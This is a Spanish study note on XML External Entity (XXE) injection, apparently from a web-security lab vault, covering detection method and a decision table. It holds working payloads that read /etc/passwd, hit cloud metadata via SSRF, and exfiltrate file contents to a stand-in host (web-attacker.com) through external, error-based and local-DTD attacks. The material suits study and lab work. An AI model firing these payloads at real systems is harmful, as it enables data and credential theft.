---
aliases:
  - XXE
  - xxe-entrypoint
  - XML External Entity
  - XML external entity injection
tags:
  - vuln/xxe
  - entrypoint
---

# XXE — Punto de entrada

> Documento **agnóstico al negocio**: *cómo **detectar y explotar** XXE*.
> **Fundamentos** (qué es XML/DTD/entidades, y los payloads encadenados a fondo) → [[how-to-work/xml|Cómo funciona XML, DTD y entidades]].
> **Dónde** aplica (qué endpoint come XML) → eso vive en los `STAGE_x`.

> [!abstract] La idea en una línea
> Si la app **parsea XML que vos controlás**, inyectás un `<!DOCTYPE>` con una **entidad `SYSTEM`** y el **parser** abre por vos un **archivo local**, una **URL interna (SSRF)** o **exfiltra** datos out-of-band. El bug no es de un template ni de un lenguaje: es del **parser XML** con features peligrosas habilitadas.

## 📚 Referencias rápidas

- 🧠 **Fundamentos** (qué es XML, entities, DTD internal/external, entidades general `&` vs de parámetro `%`) → [[how-to-work/xml|how-to-work/xml]]
- 🧪 **Laboratorios** — 9 labs (2 Apprentice + 6 Practitioner + 1 Expert), payload por lab → [[vulnerabilities/006-xxe/labs/README|labs/README]]
- 🐍 **Ejemplos / PoCs completas** (vector entero: request + `Content-Type` + DTD + verificación):
    - [[vulnerabilities/006-xxe/examples/leer-archivo-in-band|leer archivo in-band]] · [[vulnerabilities/006-xxe/examples/xxe-a-ssrf-metadata-cloud|XXE → SSRF metadata]] · [[vulnerabilities/006-xxe/examples/xinclude-sin-controlar-el-xml|XInclude]] · [[vulnerabilities/006-xxe/examples/xxe-por-subida-de-svg|subida de SVG]]
    - Ciego: [[vulnerabilities/006-xxe/examples/xxe-ciego-callback-oob|callback OOB]] · [[vulnerabilities/006-xxe/examples/xxe-ciego-exfiltrar-con-dtd-externo|exfiltrar con DTD externo ⭐]] · [[vulnerabilities/006-xxe/examples/xxe-ciego-error-based-con-dtd-externo|error-based]] · [[vulnerabilities/006-xxe/examples/xxe-ciego-reutilizar-dtd-local|reutilizar DTD local]]
- 🔗 **XXE → SSRF:** la entidad puede apuntar a URLs internas / metadata cloud → [[vulnerabilities/007-ssrf/README|SSRF]].
- 🔗 **Superficie oculta:** SVG, DOCX/XLSX, SOAP, RSS = **XML** → cualquier [[vulnerabilities/017-file-upload-vulnerabilities/README|upload]] que los procese es candidato.

## 🎯 Cuándo hay XXE (condiciones)

1. **La app recibe XML que vos podés influir** — body `Content-Type: application/xml`, un `<!DOCTYPE>` en la request, un campo que termina dentro de un XML del server, o un archivo **SVG/Office** que se parsea.
2. **El parser resuelve entidades externas / DTDs** (no está endurecido). Si las resuelve → XXE.
3. **Para sacar datos** necesitás una vía de salida: **reflejo** (in-band), **OOB** (Collaborator), **error verboso**, o **DTD local** (último recurso).

## 🧪 Cómo cazarlo (metodología)

1. **Encontrá el XML.** Cualquier request cuyo body sea `<...>` (el clásico **"Check stock"** `POST /product/stock`), o un endpoint que acepte SVG/DOCX/SOAP.
2. **Probá una entidad in-band.** Meté una DTD interna y referenciá la entidad donde el valor se **refleje** en la respuesta:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <!-- reemplazá un valor reflejado (p.ej. productId) por &xxe; -->
   ```
   - ¿Vuelve el contenido? → **XXE in-band** ✅.
3. **¿No refleja nada? → blind.** Probá interacción OOB (Collaborator):
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB"> ]>
   ```
   - Si el parser **bloquea entidades generales externas**, pasá a **entidad de parámetro**: `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;`.
4. **Elegí cómo exfiltrar** según lo que tengas (ver árbol abajo).

> [!note] ¿Requiere enviar exploit?
> **No** en la mayoría: XXE se dispara en la **misma request** que mandás vos (Repeater). Solo necesitás infra externa (**exploit server** para la DTD, **Collaborator** para OOB) cuando es **blind**. No hace falta víctima/admin como en CORS/CSRF/XSS.

---

## 🧩 Árbol de decisión (según lo que puedas hacer)

| Situación | Técnica | Payload |
| --- | --- | --- |
| Controlás el XML **y la respuesta refleja** | **In-band file read** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` |
| Querés pegarle a algo interno | **XXE → SSRF** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/…">` |
| **No** controlás el documento entero (solo un valor) | **XInclude** | `<xi:include>` (ver abajo) |
| El input es una **imagen/archivo** | **XXE en SVG/Office** | SVG con `<!DOCTYPE>` → [[vulnerabilities/006-xxe/bitso.0whvrzxl.oti8.svg|PoC]] |
| Blind, solo confirmar | **OOB** con Collaborator | `SYSTEM "http://COLLAB"` (general → si filtran, `%` de parámetro) |
| Blind, querés el **contenido** | **DTD externa** (exfil) | → [[#Blind — exfiltrar contenido con DTD externa (OOB)\|exfil OOB]] |
| Blind, hay **errores verbosos** | **Error-based** | → [[#Blind — forzar error para leer el archivo (error-based)\|error-based]] |
| Blind, **sin salida a internet** | **Reutilizar DTD local** | → [[#Blind — reutilizar un DTD local (sin salida a internet)\|local DTD]] |

### In-band: leer archivo
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XXE → SSRF (metadata cloud)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/…"> ]>
<!-- &xxe; en el valor reflejado -->
```

### XInclude (cuando NO controlás el `<!DOCTYPE>`)
Cuando tu input es solo **un valor** que el server mete en un XML propio, no podés poner un DOCTYPE. Inyectás un `XInclude` en ese valor:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 🪜 Escalera del XXE ciego (blind)

Cuando la respuesta **no refleja** nada, escalás con **entidades de parámetro** (`%`). De más simple a más retorcido. Reemplazá `web-attacker.com` por tu **exploit server / Collaborator**.

> Recordá el concepto de entidades general vs. de parámetro → [[how-to-work/xml#3. Tipos de entidad|how-to-work/xml]].

### Cargar un DTD externo
Las técnicas de abajo (`%eval`, etc.) **no** se pueden declarar en una DTD interna (restricción de XML sobre entidades de parámetro en el subset interno). Solución: hospedar el DTD en tu server y **cargarlo** desde la request:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
`malicious.dtd` contiene el bloque de exfil o de error de abajo.

### Blind — exfiltrar contenido con DTD externa (OOB)
Una entidad lee el archivo (`%file`), otra construye dinámicamente la que lo **manda por la URL** de tu server (`%exfiltrate`). Va en tu `malicious.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
> `&#x25;` es `%` escapado (necesario para declarar una entidad **dentro** de otra).
> **Variante FTP:** si un firewall bloquea la salida HTTP, cambiá `http://` por `ftp://web-attacker.com/…`. FTP suele estar menos filtrado y tolera contenidos con caracteres que romperían una URL HTTP (saltos de línea, etc.).

### Blind — forzar error para leer el archivo (error-based)
Sin salida OOB pero con **errores verbosos**: hacés que el parser intente abrir una ruta **inexistente** cuyo nombre **contiene el archivo** → el error filtra el contenido:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
El parser intenta abrir `file:///nonexistent/root:x:0:0:...` → *No such file* → **el error trae el contenido de `/etc/passwd`**.

### Blind — reutilizar un DTD local (sin salida a internet)
Peor caso: la petición **no devuelve** el resultado **y** no hay salida OAST (ni OOB ni DTD externa porque no hay internet). Cargás un **DTD que ya existe en el disco** del server y **redefinís una de sus entidades** para inyectar el ataque error-based — todo local:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
`custom_entity` **tiene que ser el nombre de una entidad que exista dentro de `schema.dtd`**: al cargar el DTD local, tu redefinición se dispara y ejecuta el ataque error-based.

```mermaid
sequenceDiagram
    autonumber
    participant A as Atacante
    participant P as XML Parser
    participant F as Filesystem
    participant App as Aplicación

    A->>P: XML con DTD interna
    P->>F: Leer schema.dtd local
    F-->>P: Contenido de schema.dtd

    rect rgb(60, 60, 70)
        Note over P: custom_entity existe en schema.dtd<br/>La DTD interna la redefine
    end

    P->>F: Leer /etc/passwd
    F-->>P: Contenido del archivo
    P->>F: Abrir file:///nonexistent/&lt;contenido&gt;
    F-->>P: File not found

    rect rgb(70, 60, 60)
        P-->>A: XML parsing error CON el contenido de /etc/passwd
    end

    P --x App: La aplicación nunca procesa el XML (el parseo falló)
```

### Buscar DTD locales
Para el ataque anterior necesitás **conocer un DTD local** y una entidad suya. El más usado es el de GNOME **`yelp`**, presente en muchas imágenes Linux. Primero **confirmás que existe** cargándolo solo:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Si **no** da error, el archivo existe → después redefinís una de **sus** entidades (en `docbookx.dtd` se usa `ISOamso`) con el bloque del ejemplo anterior.

---

> [!tip] Reglas mentales
> - **`&x;`** = cuerpo del XML (in-band) · **`%x;`** = dentro del DTD (blind/encadenado).
> - **General externa bloqueada → parámetro (`%`).** Es el primer escalón cuando falla lo obvio.
> - **No controlás el doc → XInclude.** Imagen → **SVG**. Sin salida → **DTD local**.
> - **Objetivos típicos:** `/etc/passwd`, `/etc/hostname`, credenciales cloud vía SSRF, o probar OOB.

> [!note] Relación con otras vulns
> - **SSRF** — XXE es un vector clásico para llegar a la red interna/metadata → [[vulnerabilities/007-ssrf/README|SSRF]].
> - **File upload** — SVG/DOCX/SOAP son XML: un upload que los parsea = superficie XXE → [[vulnerabilities/017-file-upload-vulnerabilities/README|file upload]].
> - **SSTI** — si buscabas "qué template engine usa", eso es otra vuln → [[vulnerabilities/009-server-side-template-injection/README|SSTI]] (XXE no usa templates, usa el parser XML).
